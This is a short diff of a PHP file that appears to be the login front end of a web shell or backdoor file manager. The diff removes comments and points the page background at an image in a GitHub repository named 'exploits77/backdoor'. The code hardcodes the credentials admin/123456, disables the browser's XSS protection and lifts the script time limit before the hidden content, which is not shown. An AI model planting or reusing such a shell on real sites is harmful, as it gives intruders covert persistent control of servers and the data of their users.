@@ -1,12 +1,10 @@
 <?php
 session_start();
 
-// ==== CONFIG ====
 define('USERNAME', 'admin');
 // password: 123456
 define('PASSWORD_HASH', '$2y$10$ZOI31HwP1yz1swLQRXVGm.eFBjrksquAp291rUwM2ds2XFLyPwOhq'); 
 
-// ==== HANDLE LOGIN ====
 if (isset($_POST['fm_usr'], $_POST['fm_pwd'])) {
     if ($_POST['fm_usr'] === USERNAME && password_verify($_POST['fm_pwd'], PASSWORD_HASH)) {
         $_SESSION['logged_in'] = true;
@@ -15,7 +13,6 @@ if (isset($_POST['fm_usr'], $_POST['fm_pwd'])) {
     }
 }
 
-// ==== CEK LOGIN ====
 if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     ?>
     <!DOCTYPE html>
@@ -29,7 +26,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
         <style>
             body {
                 font-family: Arial, sans-serif;
-                background: url("https://5ax4sgf9xk.ucarecd.net/1a754cd3-9096-433b-90a1-35654dfbcb69/-/stretch/on/") repeat;
+                background: url("https://raw.githubusercontent.com/exploits77/backdoor/refs/heads/main/hexagon.gif") repeat;
                 margin: 0;
                 padding: 0;
             }
@@ -57,7 +54,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
                 color: #000;
             }
             .login-box h2 span {
-                color: #28a745; /* aksen hijau */
+                color: #28a745; 
             }
             .login-box small {
                 display: block;
@@ -130,7 +127,6 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     exit;
 }
 
-// ==== CONTENT ====
 header("X-XSS-Protection: 0");
 ob_start();
 set_time_limit(0);
